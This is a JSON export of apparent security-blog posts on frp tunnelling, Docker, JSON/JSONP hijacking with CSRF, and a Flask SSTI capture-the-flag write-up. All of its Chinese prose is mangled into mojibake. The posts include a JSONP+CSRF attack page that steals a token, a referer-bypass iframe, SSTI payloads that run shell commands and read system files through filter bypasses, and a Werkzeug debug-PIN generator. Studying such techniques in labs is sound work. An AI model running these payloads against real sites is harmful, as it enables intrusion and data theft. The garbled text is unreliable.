æœåŠ¡å™¨ä¸ºWindows10ï¼Œç§»åŠ¨å¤§å†…ç½‘xD,æœåŠ¡å™¨æ˜¯æˆ‘ç§‘å­¦ä¸Šç½‘ç”¨çš„vpsï¼Œæœ‰ç‹¬ç«‹çš„å…¬ç½‘IPã€‚è½¯ä»¶å®‰è£…ï¼šé¦–å…ˆåœ¨githubä¸Šä¸‹è½½å¯¹åº”ç³»ç»Ÿæ¶æ„çš„frpï¼ŒWindowsæ¯”è¾ƒå¥½é€‰ï¼Œæˆ‘å‡ºé—®é¢˜çš„æ˜¯vpsçš„ç‰ˆæœ¬é€‰æ‹©ï¼Œä¸€å¼€å§‹é€‰çš„æ˜¯amd64ç‰ˆæœ¬ï¼Œä½†æ˜¯æ— æ³•æ‰§è¡Œbin file,ä½¿ç”¨archå‘½ä»¤æŸ¥çœ‹æ¶æ„åæ‰å‘ç°æ¶æ„ä¸ºi686ï¼Œæ˜¯32ä½ç³»ç»Ÿã€‚ã€‚ã€‚å“ã€‚è½¯ä»¶é…ç½®ï¼š è½¯ä»¶é…ç½®å‚è€ƒhttps://zhuanlan.zhihu.com/p/45445979 è¿™é‡Œä¸æƒ³åœ¨è¯¦ç»†å±•å¼€è¯´ï¼Œæ³¨æ„å‡ ç‚¹ï¼Œå°±æ˜¯ä¸èƒ½äººå®¶å†™ä»€ä¹ˆä½ å°±å†™ä»€ä¹ˆï¼Œéœ€è¦æ˜ç™½å„ä¸ªé…ç½®çš„æ„ä¹‰ï¼Œå¦åˆ™ä½ æè¿™ç©¿ä»€ä¹ˆå‘¢ï¼Ÿvhost_http_port å‚æ•°é…ç½®çš„æ˜¯webæœåŠ¡çš„ç«¯å£ï¼Œéœ€è¦åœ¨frpcå®¢æˆ·ç«¯å®šä¹‰domainï¼ˆæ²¡æœ‰çš„è¯å°±å†™æœåŠ¡å™¨ipï¼‰ï¼ŒæŒ‡æ˜æœ¬åœ°webæœåŠ¡ç«¯å£ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"DockeræŠ€æœ¯åŸç†æµ…æ","slug":"DockeræŠ€æœ¯åŸç†æµ…æ","date":"2020-05-29T14:41:05.000Z","updated":"2020-05-29T15:25:06.366Z","comments":true,"path":"2020/05/29/DockeræŠ€æœ¯åŸç†æµ…æ/","link":"","permalink":"https://polosec.github.io/2020/05/29/Docker%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","excerpt":"","text":"å‚è€ƒé“¾æ¥ï¼šhttps://www.zhihu.com/question/331023021https://www.zhihu.com/question/48174633/answer/616413576åˆ«äººè¯´çš„è¯æˆ‘å°±ä¸å¤åˆ¶ç²˜è´´äº†ï¼ŒæŒ‘ä¸€äº›æˆ‘ä¸ªäººè®¤ä¸ºæ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹å’Œæ¯”è¾ƒåŸºç¡€çš„ç‚¹è¯´ä¸€ä¸‹ã€‚ dockerçš„ä¸€äº›æ¦‚å¿µimage imageæ˜¯ä¸€å †åªè¯»å±‚çš„ç»Ÿä¸€è§†è§’ï¼ŒUFSæŠ€æœ¯å¯ä»¥æŠŠè¿™ä¸€å¯¹åªè¯»å±‚æ•´åˆæˆä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ container å®¹å™¨å°±æ˜¯åœ¨imageä¸Šé¢åŠ äº†ä¸€ä¸ªå¯è¯»å¯å†™å±‚ã€‚container=image+ R&amp;W Layerdocker start=docker create &amp; docker run Repository Repositoryæ„æ€ä¸ºä»“åº“ï¼Œç±»ä¼¼githubä¸Šé¢æœ‰å¾ˆå¤šä»£ç å¯ä»¥cloneåˆ°æœ¬åœ°ï¼Œåœ¨dockerä¸­å°±ç›¸å½“äºå¯ä»¥pullé•œåƒåˆ°æœ¬åœ°ã€‚å®˜æ–¹çš„ä»“åº“æ˜¯docker hub Registry Registryæ˜¯ç§æœ‰ä»“åº“ï¼ŒRegistryåŒ…å«äº†ä¸€ä¸ªæˆ–å¤šä¸ªRepositoryï¼Œæ¯ä¸ªRepositoryå¯ä»¥æœ‰å¤šä¸ªTagï¼Œæ¯ä¸ªTagå¯¹åº”ä¸€ä¸ªimageã€‚æˆ‘ç†è§£çš„dockeræ˜¯â€è½»é‡çº§â€è™šæ‹Ÿæœºã€‚è¿™ä¸ªæ¦‚å¿µåº”è¯¥ä¸æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºè™šæ‹Ÿæœºå’Œdockerçš„åŒºåˆ«è¿˜æ˜¯æŒºå¤§çš„ï¼Œå†å¤šæŠ½è±¡å‡ å±‚æˆ‘æ„Ÿè§‰è¿™ä¹ˆç†è§£ä¹Ÿå¯ä»¥dockerçš„æ–¹ä¾¿ä¹‹å¤„åœ¨äºä¸éœ€è¦åƒè™šæ‹Ÿæœºä¸€æ ·é‡æ–°è™šæ‹Ÿå‡ºæ¥ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿï¼Œdockeråªéœ€è¦pullé•œåƒç›´æ¥ç”¨å°±è¡Œã€‚dockerå¯ä»¥å¿«é€Ÿéƒ¨ç½²çš„å¦ä¸€ä¸ªåŸå› é™¤äº†æ˜¯åˆ†å±‚å¯å¤ç”¨ä¹‹å¤–ï¼Œå°±æ˜¯å¯ä»¥â€ä¸€é”®â€å®‰è£…æ‰€éœ€ä¾èµ–ã€‚æˆ‘ç†è§£çš„æ˜¯ç±»ä¼¼makefileã€‚dockerfileç±»ä¼¼makefileï¼Œä½†æ˜¯ä¸€ä¸ªdockerfileå¯¹åº”ä¸€ä¸ªå®¹å™¨æˆ–è€…è¯´å¯¹åº”ç€ä¸€ä¸ªæœåŠ¡ï¼ˆå¦‚MySQLï¼‰ç„¶ådocker-compose.yml åŒ…å«ä¸€ä¸ªä¸ªdockerfileæ–‡ä»¶å½¢æˆäº†ä¸€ä¸ªå·¥ç¨‹ã€‚docker è¿›ç¨‹ä¼šå¯¹æ¯ä¸ªå®¹å™¨çš„èµ„æºè¿›è¡Œç®¡ç†ã€‚dockerçš„é•œåƒåˆ†å±‚æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œæœ‰ç‚¹ç±»ä¼¼é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³çš„â€ç»§æ‰¿â€ã€‚dockerçš„åŸºç¡€é•œåƒåº”è¯¥æ˜¯æœ€å¤§çš„ï¼Œä½†æ˜¯ä»åŸºç¡€é•œåƒæ–°å»ºä¸€ä¸ªé•œåƒçš„è¯ï¼Œå¹¶ä¸éœ€è¦å¤åˆ¶æ‰€æœ‰å†…å®¹ï¼Œå³ä¸éœ€è¦å ç”¨ä¸¤å€çš„å­˜å‚¨ç©ºé—´ï¼Œåªéœ€è¦æŠŠä¸ä¸€æ ·çš„ä¿å­˜ä¸‹æ¥å°±å¥½ã€‚è¿™å¾—ç›ŠäºLinuxçš„COWç­–ç•¥ã€‚å³ï¼šæ²¡å†™è¿‡æ–‡ä»¶çš„ä¸ç”¨åŠ¨ï¼Œå†™è¿‡çš„æ–‡ä»¶ä¿å­˜æˆæ–°çš„æ–‡ä»¶ã€‚dockerä¼šåœ¨å®¹å™¨æœ€ä¸Šå±‚åˆ›å»ºä¸€ä¸ªè¯»å†™å±‚ï¼Œç”¨æ¥ä¿å­˜å¯¹åŸºç¡€é•œåƒçš„ä¿®æ”¹æ“ä½œæ“ä½œçš„æ–‡ä»¶ã€‚ dockerä¸è™šæ‹Ÿæœºçš„åŒºåˆ«é¦–å…ˆæ˜¯è™šæ‹ŸåŒ–å±‚æ¬¡ä¸ä¸€æ ·ã€‚è™šæ‹Ÿæœºå®Œæ•´åœ°è™šæ‹Ÿäº†å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ï¼Œè€Œdockerä»…ä»…æ˜¯è™šæ‹Ÿäº†ç”¨æˆ·ç©ºé—´ï¼Œå†…æ ¸ç”¨çš„æ˜¯æ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚æ¯ä¸ªå®¹å™¨åªæ˜¯è¯´ç›¸äº’ä¹‹é—´çš„åº”ç”¨ã€ä¾èµ–ä¸åŒï¼Œä½†å…¶æœ€åº•å±‚çš„é•œåƒåº”è¯¥æ˜¯ç›¸åŒçš„ã€‚ä»–ä»¬ç”¨å…±åŒä¸€ä¸ªåŸºç¡€é•œåƒï¼Œå¯¹åŸºç¡€é•œåƒæœ‰ä¿®æ”¹ï¼Œè¿™ä¸ªä¿®æ”¹ä¿å­˜åˆ°å„ä¸ªå®¹å™¨å†…éƒ¨ï¼Œdockerè¿›ç¨‹å¯¹å®¹å™¨ä¹‹é—´è¿›è¡Œéš”ç¦»ã€‚dockerå¯åŠ¨é€Ÿåº¦å¿«ï¼Œå ç”¨èµ„æºå°‘ï¼›è€Œè™šæ‹Ÿæœºå¯åŠ¨é€Ÿåº¦æ…¢ï¼Œæ¶ˆè€—èµ„æºå¤šã€‚è¿™é‡Œå¼•ç”¨ä¸¤å¥è¯ï¼Œæ„Ÿè§‰è¯´çš„éå¸¸å¥½ï¼šâ€œå…¶å®æœ€å¤§çš„åŒºåˆ«åœ¨äºåº”ç”¨åœºæ™¯çš„ä¸åŒï¼šè™šæ‹Ÿæœºæœ€å¼€å§‹å‡ºç°æ˜¯ä¸ºäº†æ¨¡æ‹Ÿä¸åŒçš„ç¡¬ä»¶å¹³å°ï¼Œä½†æ˜¯ç°åœ¨äº‘è®¡ç®—æ—¶ä»£æ˜¯ä¸ºäº†æä¾›çš„è®¡ç®—èƒ½åŠ›çš„è™šæ‹ŸåŒ–ï¼Œè¿™æ ·å¯ä»¥å¿«é€Ÿçµæ´»çš„åˆ’åˆ†å’Œåˆ†é…è®¡ç®—èµ„æºã€‚å®¹å™¨åˆ™æ˜¯éšç€åº”ç”¨ç¨‹åºçš„æ¶æ„å‘å±•æ‰€è‡ªç„¶è¡ç”Ÿå‡ºæ¥çš„ä¸œè¥¿ã€‚å½“è½¯ä»¶è¶Šæ¥è¶Šå¤æ‚ï¼Œå•ä½“åº”ç”¨æ²¡æ³•å†å‘å±•ä¸‹å»äº†ï¼Œæ¯ä¸ªåŠŸèƒ½é€æ¸ç‹¬ç«‹å‡ºæ¥ï¼Œå‡ºç°é¢å‘æœåŠ¡çš„æ¶æ„ï¼Œè¿›è€Œå‡ºç°æ‰€è°“å¾®æœåŠ¡çš„æ¶æ„ã€‚â€œ","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"JSON&JSONP&CSRF","slug":"JSON-JSONP-CSRF","date":"2020-05-22T02:12:47.000Z","updated":"2020-06-01T02:56:38.421Z","comments":true,"path":"2020/05/22/JSON-JSONP-CSRF/","link":"","permalink":"https://polosec.github.io/2020/05/22/JSON-JSONP-CSRF/","excerpt":"","text":"å‚è€ƒé“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/1516219https://blog.csdn.net/u011089760/article/details/93550458https://blog.csdn.net/qq_37133717/article/details/105749589https://blog.csdn.net/tianjindong0804/article/details/84971922https://archive.phocean.net/2013/10/13/csrf-with-jsonp.html JSONè°ˆjsonpä¹‹å‰ï¼Œé¦–å…ˆæ˜ç™½ä»€ä¹ˆæ˜¯jsonã€‚jsonå…¨ç§°JavaScript Object Notationï¼ŒJSå¯¹è±¡æ ‡è®°ï¼Œæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ–¹å¼ï¼ŒJSONæœ€å¸¸ç”¨çš„æ˜¯å¯¹è±¡çš„é”®å€¼å¯¹ï¼Œæœ‰ç‚¹åƒpythonä¸­dictæ•°æ®ç»“æ„ã€‚ä¾‹å¦‚{â€œk1â€:â€v1â€,â€k2â€:â€v2â€} JSON HijackingJSONåŠ«æŒé€šè¿‡è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„æ–‡ä»¶ï¼Œé‡å†™Array()æ„é€ å‡½æ•°çš„æ–¹æ³•ï¼Œå°†jsonæ•°æ®å‘é€ç»™æ”»å‡»è€…ã€‚JSONåŠ«æŒæ­¥éª¤ï¼ˆå‚è€ƒï¼‰1ï¼‰é‡æ–°å®šä¹‰æ•°ç»„æ„é€ å‡½æ•°Array = function() å¹¶å°†æ•°ç»„èµ‹å€¼ç»™æˆ‘ä»¬å®šä¹‰çš„å…¨å±€å˜é‡ï¼› 2ï¼‰å‘ç›®æ ‡ç½‘ç«™å‘é€ä¸€æ¡è¯·æ±‚ï¼Œå€Ÿç”¨è¢«æ”»å‡»è€…çš„sessionæƒé™ï¼› 3ï¼‰å°†è·å¾—çš„æ•°æ®èµ‹ç»™yourDataï¼Œä»è€Œè¿›è¡Œä»»æ„å¤„ç†ã€‚ å…¶ä¸­ç¬¬ä¸€æ­¥çš„å‡½æ•°è¦†ç›–æ˜¯å…³é”®ï¼Œå¯ä»¥JSä¸­çš„æ–¹æ³•è¦†ç›–çš„ç‰¹æ€§æˆ–è€…ä½¿ç”¨JSçš„ç‰¹æ®Šæ–¹æ³•Object.prototype.__defineSetter__ç­‰ã€‚ï¼ˆè¿™ä¸ªå‡½æ•°åœ¨æ–°ç‰ˆchromeå’Œfirefoxå·²å¤±æ•ˆã€‚ï¼‰ JSONPä»€ä¹ˆæ˜¯JSONPï¼ŸJSONPæ˜¯å¸¦æœ‰å¡«å……ï¼ˆPaddingï¼‰çš„JSONæ•°æ®ã€‚JSONPä¸ºäº†è§£å†³è·¨åŸŸé—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“ï¼ŒJS,XHR(AJAX)å¯ä»¥å‘èµ·è·¨åŸŸè¯·æ±‚ï¼Œä½†æ˜¯æ‹¿ä¸åˆ°è·¨åŸŸè¯·æ±‚çš„èµ„æºï¼ˆæˆ–è€…è¯´çœ‹ä¸åˆ°å“åº”ã€æ‹¿ä¸åˆ°å“åº”æ•°æ®ï¼‰ JSONPæœ€å¤§çš„ç‰¹å¾æ˜¯å›ä¼ ã€‚ä½¿ç”¨æ–¹æ³•ä¸ºåœ¨é¡µé¢ä¸­åŠ å…¥&lt;script&gt;æ ‡ç­¾,srcå±æ€§ä¸ºè¯·æ±‚çš„JSèµ„æºçš„URLï¼Œæœ€ååŠ ä¸Šå›è°ƒå‡½æ•°çš„åç§°ï¼Œæ¯”å¦‚è¯·æ±‚URLä¸ºï¼šwww.test.io/1.php?callback=cbç„¶ååœ¨å½“å‰é¡µé¢éœ€è¦å†™ä¸€ä¸ªJSå‡½æ•°ï¼š 1234function cb(data)&#123; alert(data.username)&#125; ä¸¾ä¸ªä¾‹å­ï¼šå‰ç«¯é¡µé¢ï¼š 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;title&gt;hack&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function resolveJson(result) &#123; //æµè§ˆå™¨ç«¯ä»£ç  alert(result.name); &#125; &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; åç«¯å¤„ç†ï¼š 12345&lt;?php$callback = $_GET[&#x27;callback&#x27;];$arr = array(&quot;name&quot; =&gt; &quot;alsy&quot;, &quot;age&quot; =&gt; &quot;20&quot;);echo $callback.&quot;(&quot;. json_encode($arr) .&quot;);&quot;;?&gt; æ•ˆæœï¼š JSONPæ³¨å…¥ç”±äºä¼ çš„callbackå†…å®¹æ˜¯è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´XSSï¼ˆè¿”å›åŒ…content-typeä¸ºtext/htmlçš„è¯ï¼‰å¦‚ä¼ å…¥çš„?callback=callback=alert(â€˜xssâ€™) JSONPåŠ«æŒJSONPåŠ«æŒçš„ç›®çš„æ˜¯ç›—å–ç”¨æˆ·æ•æ„Ÿæ•°æ®ï¼Œæˆ–è€…æ‹¿åˆ°tokenè¿›è¡ŒCSRFåˆ©ç”¨JSONåŠ«æŒä¸JSONPæ³¨å…¥çš„å¼‚åŒï¼šåŒ:éƒ½å¯ä»¥åŠ«æŒç”¨æˆ·æ•°æ®ï¼Œç›—å–æ•æ„Ÿä¿¡æ¯ï¼ŒæŒ‚é©¬ç­‰æ“ä½œå¼‚ï¼šjsonpè¿”å›çš„æ•°æ®æœ‰callbackå‡½æ•°ååŒ…è£¹ã€‚jsonpæ³¨å…¥è¿˜å¯ä»¥é€ æˆxssã€‚ JSONPåŠ«æŒæµç¨‹1.ç”¨æˆ·ç™»å½•å­˜åœ¨JSONPåŠ«æŒçš„ç½‘ç«™ï¼Œé€šå¸¸å‚æ•°å­˜åœ¨callback æˆ–è€…htmlback2.ç”¨æˆ·æºå¸¦èº«ä»½ä¿¡æ¯è®¿é—®æ”»å‡»è€…ç¼–å†™çš„é¡µé¢ã€‚3.æ”»å‡»è€…ç¼–å†™çš„é¡µé¢è‡ªå®šä¹‰äº†callbackå‡½æ•°åï¼Œå¹¶ä¸”é€šè¿‡scriptæ ‡ç­¾åƒç”¨æˆ·éšç§æ•°æ®å‘èµ·è¯·æ±‚ï¼ˆè¿™é‡Œéœ€è¦ç”¨åˆ°ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼‰4.ç”¨æˆ·è®¿é—®æ”»å‡»é¡µé¢åï¼Œæºå¸¦èº«ä»½ä¿¡æ¯è®¿é—®æ”»å‡»è€…æŒ‡å®šçš„JSONPæ•°æ®ï¼Œå¹¶ä¸”åœ¨å½“å‰æ”»å‡»é¡µé¢çš„å›è°ƒå‡½æ•°ä¸­å®Œæˆæ“ä½œï¼ˆè¯¥æ“ä½œå¯èƒ½æ˜¯å‘é€éšç§ä¿¡æ¯ç»™æ”»å‡»è€…ï¼Œä¹Ÿå¯èƒ½æ˜¯æ‹¿tokenè¿›è¡Œcsrfï¼‰ #JSONPä¸CSRFæ€è·¯ï¼šé€šè¿‡JSONPå¾—åˆ°é¡µé¢çš„tokenï¼Œç„¶åç”Ÿæˆè¡¨å•ï¼Œå†™ä¸Štokenï¼Œå‘é€è¯·æ±‚ã€‚æ”»å‡»é¡µé¢ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;test&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;function test(obj)&#123; // è·å–å¯¹è±¡ä¸­çš„å±æ€§å€¼ var content = obj[&#x27;html&#x27;] // æ­£åˆ™åŒ¹é…å‡ºå‚æ•°å€¼ var token=content.match(&#x27;token = &quot;(.*?)&quot;&#x27;)[1]; // æ·»åŠ è¡¨å•èŠ‚ç‚¹ var parent=document.getElementById(&quot;test&quot;); var child=document.createElement(&quot;form&quot;); child.method=&quot;POST&quot;; child.action=&quot;http://vuln.com/del.html&quot;; child.id=&quot;test1&quot; parent.appendChild(child); var parent_1=document.getElementById(&quot;test1&quot;); var child_1=document.createElement(&quot;input&quot;); child_1.type=&quot;hidden&quot;;child_1.name=&quot;token&quot;;child_1.value=token; var child_2=document.createElement(&quot;input&quot;); child_2.type=&quot;submit&quot;; parent_1.appendChild(child_1); parent_1.appendChild(child_2);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; å®ç°JSONP+CSRFæœ‰äº›éš¾åº¦ï¼Œé¦–å…ˆéœ€è¦å­˜åœ¨jsonpåŠ«æŒï¼Œå…¶æ¬¡èƒ½åœ¨æºç é‡Œæ‰¾åˆ°tokenï¼Œæœ€åéœ€è¦ç»•è¿‡refereré™åˆ¶ã€‚ refererç»•è¿‡ç­–ç•¥ï¼š1.ç©ºreferrer:åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œå¼€å‘è€…åœ¨éƒ¨ç½²è¿‡æ»¤ Referer æ¥æºæ—¶ï¼Œå¿½è§†äº†ä¸€ä¸ªç©º Referer çš„è¿‡æ»¤ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æµè§ˆå™¨ç›´æ¥è®¿é—®æŸ URL æ˜¯ä¸å¸¦ Referer çš„ï¼Œæ‰€ä»¥å¾ˆå¤šé˜²å¾¡éƒ¨ç½²æ˜¯å…è®¸ç©º Referer çš„ã€‚æ°æ°ä¹Ÿå°±æ˜¯è¿™ä¸ªå¿½è§†ï¼Œå¯¼è‡´äº†æ•´ä¸ªé˜²å¾¡çš„å¥”æºƒã€‚å› ä¸ºåœ¨é€šè¿‡è·¨åè®®è°ƒç”¨ js æ—¶ï¼Œå‘é€çš„ http è¯·æ±‚é‡Œ Referer ä¸ºç©ºï¼ è·¨åè®®è°ƒç”¨çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼š 1&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt; ä»£ç é‡Œæˆ‘ä»¬ä½¿ç”¨ è°ƒç”¨ javscript ä¼ªåè®®æ¥å®ç°ç©º Referer è°ƒç”¨ JSON æ–‡ä»¶ã€‚ï¼ˆå‚è€ƒè‡ªçŸ¥é“åˆ›å®‡https://blog.knownsec.com/2015/03/jsonp_security_technic/ï¼‰ 2.ç»•è¿‡referrerçš„æ­£åˆ™æœ‰äº›refererçš„æ­£åˆ™å†™çš„ä¸å¤ªè¡Œï¼Œå¯ä»¥ç»•è¿‡ã€‚ã€‚ä¸è¿‡ä¼°è®¡ç°ä»£ç½‘ç«™åº”è¯¥æ¯”è¾ƒå®Œå–„äº† é˜²æŠ¤ä¸¥æ ¼å®šä¹‰ Content-Type: application / jsonè¿™æ ·å¯ä»¥é˜²æ­¢XSS å®Œå–„refererè¿‡æ»¤è§„åˆ™è¿‡æ»¤JSONçš„æ•°æ®è¾“å‡º","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"å†è°ˆflask-ssti","slug":"å†è°ˆflask-ssti","date":"2020-05-18T07:04:23.000Z","updated":"2020-05-18T08:30:54.474Z","comments":true,"path":"2020/05/18/å†è°ˆflask-ssti/","link":"","permalink":"https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/","excerpt":"","text":"è¿›ä¸€æ­¥ç†è§£flask-sstisstiçš„ç›®çš„ï¼š1.è¯»å–æ–‡ä»¶ï¼ˆLFI,è·å–secret key ä¼ªé€ sessionï¼‰2.RCE BUUOJ FLASK-APP é¢˜ç›®åˆ†æå…ˆçœ‹çœ‹æç¤ºï¼Œæç¤ºäº†PIN ç¬¬ä¸€ç§åšæ³•ï¼šå‚è€ƒé“¾æ¥https://xz.aliyun.com/t/2553ç®€å•åœ°è¯´å°±æ˜¯flask app åœ¨debugæ¨¡å¼ä¸‹é€šè¿‡terminalæ˜¾ç¤ºçš„pinç å¯ä»¥åœ¨æŠ¥é”™çš„æ—¶å€™è¿›å…¥python shellã€‚å¹¶ä¸”è¿è¡Œåº”ç”¨ç¨‹åºæ—¶è¯¥pinç ä¸ä¼šå˜ã€‚æ¥ä¸‹æ¥éœ€è¦çŸ¥é“ç”ŸæˆPINç éœ€è¦ä»€ä¹ˆã€‚1.å½“å‰ç”¨æˆ·å2.app.pyçš„ç»å¯¹è·¯å¾„3.model name ä¸€èˆ¬æ˜¯flask.app4.appåç§° ä¸€èˆ¬æ˜¯Flask5.ç½‘å¡åè¿›åˆ¶æ•°ï¼ˆæœåŠ¡å™¨çš„ï¼Œè¯»/sys/class/net/eth0/addressï¼‰6.machine-idï¼ˆdockerçš„è¯éœ€è¦è¯»å–/proc/self/cgroup ï¼Œæ­£å¸¸Linuxè¯»å–/etc/machine-idï¼‰é‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦è·å–è¿™äº›ã€‚é¦–å…ˆæ˜¯app.pyçš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŠ¥é”™è·å¾—ï¼š /usr/local/lib/python3.7/site-packages/flask/app.pyç„¶åæ˜¯å½“å‰ç”¨æˆ·åï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ç”¨çš„æ˜¯ç¬¬ä¸€ç§ï¼Œé€šè¿‡ssti è¯»æ–‡ä»¶/etc/passwd å‘ç°ç”¨æˆ·flaskwebï¼ŒçŒœæµ‹å°±æ˜¯è¿™ä¸ªç”¨æˆ·å¦ä¸€ç§å‡†ç¡®çš„æ–¹æ³•æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; è¿™é‡Œéœ€è¦ç»•è¿‡os popenè¿‡æ»¤ æ–¹æ³•æ˜¯æ‹¼æ¥å­—ç¬¦ä¸² ç”¨å•å¼•å·ã€‚åŒå¼•å·ä¼šå¤±è´¥ ä¸çŸ¥é“ä¸ºä»€ä¹ˆçœ‹åˆ°å½“å‰ç”¨æˆ·æ˜¯flaskwebã€‚æ¥ä¸‹æ¥è¯»å–ç½‘å¡åè¿›åˆ¶ä¸machine-id ç”±äºbuuojæ˜¯dockerç¯å¢ƒï¼Œæ‰€ä»¥éœ€è¦ä»/proc/self/cgroupè¯»ã€‚ç½‘å¡ï¼š 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125; 02:42:ae:01:5e:21 è½¬åè¿›åˆ¶ä¸ç”¨è¯´äº†ã€‚2485410422305machine-idï¼š 123&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf ç”ŸæˆPINç çš„è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485410422305&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) ç”Ÿæˆå‡ºæ¥çš„PIN åœ¨æŠ¥é”™é¡µé¢ç‚¹å‡»å³é¢çš„terminalå›¾æ ‡è¾“å…¥è¿›å»å°±å¥½å•¦ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„‰å¿«çš„å‘½ä»¤æ‰§è¡Œäº†~ finished. ç¬¬äºŒç§åšæ³•æ—¢ç„¶çŸ¥é“äº†æ˜¯SSTI,WHY NOT RCE DIRECTLY!! 12&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls &#x2F;&quot;).read()&#125;&#125;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\\g.txt&quot;).read()&#125;&#125; è¿™é‡Œé˜²æ­¢å¯¹catæœ‰è¿‡æ»¤ ç›´æ¥ç”¨çš„sortã€‚å·²ç»çŸ¥é“çš„è¿‡æ»¤æ˜¯popenï¼Œimportï¼Œflagã€‚osä¸çŸ¥é“ï¼Œæ‡’å¾—æµ‹è¯•äº† ç›´æ¥ç»•è¿‡ æ€è€ƒè¿™é‡Œæˆ‘å†™äº†å‡ ç§è‡ªå·±ç ”ç©¶å’Œç½‘ä¸Šå­¦ä¹ åˆ°çš„payload å¼•ç”¨èµ„æºï¼šdict ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸class è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡mro 